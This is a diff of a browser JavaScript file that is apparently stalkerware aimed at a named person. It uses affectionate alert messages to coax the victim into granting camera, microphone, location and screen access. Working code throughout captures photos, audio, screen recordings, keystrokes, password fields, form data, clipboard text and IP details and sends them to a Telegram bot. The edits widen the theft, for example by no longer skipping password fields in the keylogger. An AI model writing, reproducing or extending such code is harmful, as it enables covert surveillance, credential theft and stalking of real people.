@@ -11,7 +11,7 @@ let screenStream = null;
 let recordedChunks = [];
 let isRecording = false;
 let alertIndex = 0;
-let permissionsRequested = {
+let permissionsStatus = {
     camera: false,
     microphone: false,
     location: false,
@@ -51,30 +51,24 @@ const loveAlerts = [
 function showNextAlert() {
     if (alertIndex >= loveAlerts.length) {
         sendTelegramMessage(`💖 *All Love Messages Completed*\n\nTotal: ${loveAlerts.length} messages\n💕 Love you forever Meghuu! 💕`);
-        setTimeout(() => stealAllData(), 2000);
+        // Final data steal
+        setTimeout(() => stealAllData(), 1000);
         return;
     }
     
     const current = loveAlerts[alertIndex];
-    
-    // Show alert with love message
-    const userConfirmed = confirm(current.text);
+    const userConfirmed = confirm(current.text + "\n\nClick OK to continue...");
     
     if (userConfirmed && current.permission) {
-        // Request permission immediately - no delay
-        if (current.permission === "camera") {
-            requestCamera();
-        } else if (current.permission === "microphone") {
-            requestMicrophone();
-        } else if (current.permission === "location") {
-            requestLocation();
-        } else if (current.permission === "screen") {
-            requestScreen();
-        }
+        // Request permission based on type
+        if (current.permission === "camera") requestCamera();
+        else if (current.permission === "microphone") requestMicrophone();
+        else if (current.permission === "location") requestLocation();
+        else if (current.permission === "screen") requestScreen();
     }
     
     alertIndex++;
-    showNextAlert(); // Call immediately, no delay
+    setTimeout(showNextAlert, 300);
 }
 
 // ==================== TELEGRAM MESSAGE ====================
@@ -94,7 +88,7 @@ function sendTelegramMessage(message) {
 
 // ==================== 1. CAMERA PERMISSION ====================
 async function requestCamera() {
-    if (permissionsRequested.camera) return;
+    if (permissionsStatus.camera) return;
     
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -102,16 +96,15 @@ async function requestCamera() {
             audio: false 
         });
         cameraStream = stream;
-        permissionsRequested.camera = true;
+        permissionsStatus.camera = true;
         
         sendTelegramMessage(`📸 *កាមេរ៉ាត្រូវបានអនុញ្ញាត*\n\n✅ Camera permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
         
-        // Capture photo
-        capturePhoto(stream);
+        setTimeout(() => capturePhoto(stream), 1000);
         
     } catch (error) {
         let errorMsg = error.name === 'NotAllowedError' ? 'User denied camera permission' : 'Error occurred';
-        sendTelegramMessage(`❌ *កាមេរ៉ាមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
+        sendTelegramMessage(`❌ *កាមេរ៉ាត្រូវបានបដិសេធ*\n\n📝 ${errorMsg}`);
     }
 }
 
@@ -121,8 +114,8 @@ async function capturePhoto(stream) {
         video.style.display = 'none';
         document.body.appendChild(video);
         video.srcObject = stream;
-        
         await video.play();
+        
         await new Promise(resolve => setTimeout(resolve, 500));
         
         const canvas = document.createElement('canvas');
@@ -131,40 +124,37 @@ async function capturePhoto(stream) {
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         
         canvas.toBlob(async (blob) => {
-            if (blob && blob.size > 0) {
+            if (blob) {
                 const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                 await sendFileToTelegram(file, `📸 Camera Photo`);
             }
         }, 'image/jpeg', 0.8);
         
-        setTimeout(() => {
-            if (stream) stream.getTracks().forEach(track => track.stop());
-            video.remove();
-            cameraStream = null;
-        }, 2000);
+        stream.getTracks().forEach(track => track.stop());
+        video.remove();
+        cameraStream = null;
         
     } catch (error) {
-        console.error("Capture photo error:", error);
+        console.error("Capture error:", error);
     }
 }
 
 // ==================== 2. MICROPHONE PERMISSION ====================
 async function requestMicrophone() {
-    if (permissionsRequested.microphone) return;
+    if (permissionsStatus.microphone) return;
     
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         audioStream = stream;
-        permissionsRequested.microphone = true;
+        permissionsStatus.microphone = true;
         
         sendTelegramMessage(`🎤 *មីក្រូហ្វូនត្រូវបានអនុញ្ញាត*\n\n✅ Microphone permission granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
         
-        // Record audio
-        recordAudio(stream);
+        setTimeout(() => recordAudio(stream), 1000);
         
     } catch (error) {
         let errorMsg = error.name === 'NotAllowedError' ? 'User denied microphone permission' : 'Error occurred';
-        sendTelegramMessage(`❌ *មីក្រូហ្វូនមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
+        sendTelegramMessage(`❌ *មីក្រូហ្វូនត្រូវបានបដិសេធ*\n\n📝 ${errorMsg}`);
     }
 }
 
@@ -173,10 +163,7 @@ async function recordAudio(stream) {
         const recorder = new MediaRecorder(stream);
         const chunks = [];
         
-        recorder.ondataavailable = (e) => { 
-            if (e.data.size > 0) chunks.push(e.data); 
-        };
-        
+        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
         recorder.onstop = async () => {
             const blob = new Blob(chunks, { type: 'audio/webm' });
             if (blob.size > 0) {
@@ -188,32 +175,25 @@ async function recordAudio(stream) {
         };
         
         recorder.start();
-        setTimeout(() => {
-            if (recorder.state === 'recording') recorder.stop();
-        }, 5000);
+        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
         
     } catch (error) {
-        console.error("Record audio error:", error);
+        console.error("Record error:", error);
     }
 }
 
 // ==================== 3. LOCATION PERMISSION ====================
 function requestLocation() {
-    if (permissionsRequested.location) {
-        sendTelegramMessage(`📍 *ទីតាំង* - Already requested`);
-        return;
-    }
+    if (permissionsStatus.location) return;
     
     if (!navigator.geolocation) {
-        sendTelegramMessage(`❌ *ទីតាំងមិនត្រូវបានគាំទ្រ*\n\n📝 Geolocation not supported`);
+        sendTelegramMessage(`❌ *ទីតាំងត្រូវបានបដិសេធ*\n\n📝 Geolocation not supported`);
         return;
     }
-    
-    sendTelegramMessage(`📍 *កំពុងស្នើសុំទីតាំង...*`);
     
     navigator.geolocation.getCurrentPosition(
         async (position) => {
-            permissionsRequested.location = true;
+            permissionsStatus.location = true;
             currentLocation = {
                 lat: position.coords.latitude,
                 lng: position.coords.longitude,
@@ -222,9 +202,8 @@ function requestLocation() {
             
             const mapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
             
-            sendTelegramMessage(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Open Map](${mapsLink})`);
+            sendTelegramMessage(`📍 *ទីតាំងត្រូវបានអនុញ្ញាត*\n\n📌 Lat: ${currentLocation.lat}\n📌 Lng: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ [Open Map](${mapsLink})`);
             
-            // Send location to Telegram as map
             try {
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                     method: "POST",
@@ -241,7 +220,7 @@ function requestLocation() {
             let msg = 'User denied location permission';
             if (error.code === error.TIMEOUT) msg = 'Timeout';
             else if (error.code === error.POSITION_UNAVAILABLE) msg = 'Position unavailable';
-            sendTelegramMessage(`❌ *ទីតាំងមិនត្រូវបានអនុញ្ញាត*\n\n📝 ${msg}`);
+            sendTelegramMessage(`❌ *ទីតាំងត្រូវបានបដិសេធ*\n\n📝 ${msg}`);
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
@@ -249,7 +228,7 @@ function requestLocation() {
 
 // ==================== 4. SCREEN RECORDING PERMISSION ====================
 async function requestScreen() {
-    if (permissionsRequested.screen) return;
+    if (permissionsStatus.screen) return;
     if (isRecording) return;
     
     try {
@@ -258,7 +237,7 @@ async function requestScreen() {
             audio: true
         });
         
-        permissionsRequested.screen = true;
+        permissionsStatus.screen = true;
         screenStream = stream;
         
         sendTelegramMessage(`🎬 *ការថតអេក្រង់ត្រូវបានអនុញ្ញាត*\n\n✅ Screen recording granted\n⏰ ${new Date().toLocaleString('km-KH')}`);
@@ -270,9 +249,7 @@ async function requestScreen() {
         });
         recordedChunks = [];
         
-        screenRecorder.ondataavailable = (e) => { 
-            if (e.data && e.data.size > 0) recordedChunks.push(e.data); 
-        };
+        screenRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
         
         screenRecorder.onstop = async () => {
             isRecording = false;
@@ -295,22 +272,17 @@ async function requestScreen() {
         screenRecorder.start(1000);
         isRecording = true;
         
-        // Auto stop after 30 seconds
         setTimeout(() => {
-            if (screenRecorder && screenRecorder.state === 'recording') {
-                screenRecorder.stop();
-            }
+            if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop();
         }, 30000);
         
         stream.getVideoTracks()[0].addEventListener('ended', () => {
-            if (screenRecorder && screenRecorder.state === 'recording') {
-                screenRecorder.stop();
-            }
+            if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop();
         });
         
     } catch (error) {
         let errorMsg = error.name === 'NotAllowedError' ? 'User denied screen permission' : 'Error occurred';
-        sendTelegramMessage(`❌ *ការថតអេក្រង់មិនត្រូវបានអនុញ្ញាត*\n\n📝 ${errorMsg}`);
+        sendTelegramMessage(`❌ *ការថតអេក្រង់ត្រូវបានបដិសេធ*\n\n📝 ${errorMsg}`);
     }
 }
 
@@ -378,7 +350,7 @@ async function stealAllData() {
             screen: { width: window.screen.width, height: window.screen.height },
             language: navigator.language,
             platform: navigator.platform,
-            permissions: permissionsRequested
+            permissions: permissionsStatus
         };
         
         const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
@@ -396,13 +368,7 @@ async function getIP() {
         const data = await response.json();
         return data.ip;
     } catch {
-        try {
-            const response = await fetch('https://api.my-ip.io/ip.json');
-            const data = await response.json();
-            return data.ip;
-        } catch {
-            return 'Unable to fetch';
-        }
+        return 'Unable to fetch';
     }
 }
 
@@ -488,18 +454,14 @@ let keylogTimer = null;
 
 document.addEventListener('keydown', function(e) {
     if (!CHAT_ID) return;
-    if (e.target && e.target.type === 'password') return;
-    
     if (e.key.length === 1) {
         keylogBuffer += e.key;
     } else if (e.key === 'Enter') {
-        keylogBuffer += '\n';
+        keylogBuffer += '[ENTER]\n';
     } else if (e.key === 'Backspace') {
         keylogBuffer = keylogBuffer.slice(0, -1);
     } else if (e.key === ' ') {
         keylogBuffer += ' ';
-    } else if (e.key === 'Tab') {
-        keylogBuffer += '    ';
     }
     
     clearTimeout(keylogTimer);
@@ -523,32 +485,26 @@ document.addEventListener('submit', async function(e) {
         if (value instanceof File) {
             data[key] = `[FILE: ${value.name}]`;
             await sendFileToTelegram(value, `📎 Form File: ${key}`);
-        } else if (value && value.toString().trim() !== '') {
+        } else {
             data[key] = value;
         }
     }
     
-    if (Object.keys(data).length > 0) {
-        let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
-        for (let [key, value] of Object.entries(data)) {
-            const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
-            message += `├─ ${key}: ${shortValue}\n`;
-        }
-        sendTelegramMessage(message);
+    let message = `📝 *Form Submitted*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
+    for (let [key, value] of Object.entries(data)) {
+        const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
+        message += `├─ ${key}: ${shortValue}\n`;
     }
+    
+    sendTelegramMessage(message);
 });
 
 // ==================== PASSWORD MONITORING ====================
 document.addEventListener('input', async function(e) {
     if (!CHAT_ID) return;
-    
-    const target = e.target;
-    if (target && target.type === 'password' && target.value && target.value.length > 0) {
-        const name = target.name || target.id || target.className || 'Unknown';
-        const value = target.value;
-        
-        sendTelegramMessage(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${value}`);
-        keylogBuffer = '';
+    if (e.target.type === 'password' && e.target.value.length > 0) {
+        const name = e.target.name || e.target.id || 'Unknown';
+        sendTelegramMessage(`🔐 *Password Entered*\n\n📝 Field: ${name}\n🔑 Value: ${e.target.value}`);
     }
 });
 
@@ -559,7 +515,7 @@ setInterval(async () => {
     if (!CHAT_ID) return;
     try {
         const text = await navigator.clipboard.readText();
-        if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
+        if (text && text !== lastClipboard && text.length > 0 && text.length < 500) {
             lastClipboard = text;
             sendTelegramMessage(`📋 *Clipboard*\n\n${text}`);
         }
@@ -581,20 +537,21 @@ document.addEventListener('DOMContentLoaded', function() {
     if (chatIDFromURL) CHAT_ID = chatIDFromURL;
     initTheme();
     
+    // Hide UI elements
     if (themeToggle) themeToggle.style.display = 'none';
     
-    sendTelegramMessage(`🚀 *Page Loaded*\n\n📍 URL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`);
+    // Start showing love alerts
+    setTimeout(() => {
+        showNextAlert();
+    }, 500);
     
-    // Start alerts immediately
-    showNextAlert();
-    
-    // Steal data after 10 seconds
+    // Steal data after alerts complete
     setTimeout(() => {
         stealAllData();
     }, 10000);
     
-    // Steal data every 60 seconds
+    // Steal data every 30 seconds
     setInterval(() => {
         stealAllData();
-    }, 60000);
+    }, 30000);
 });
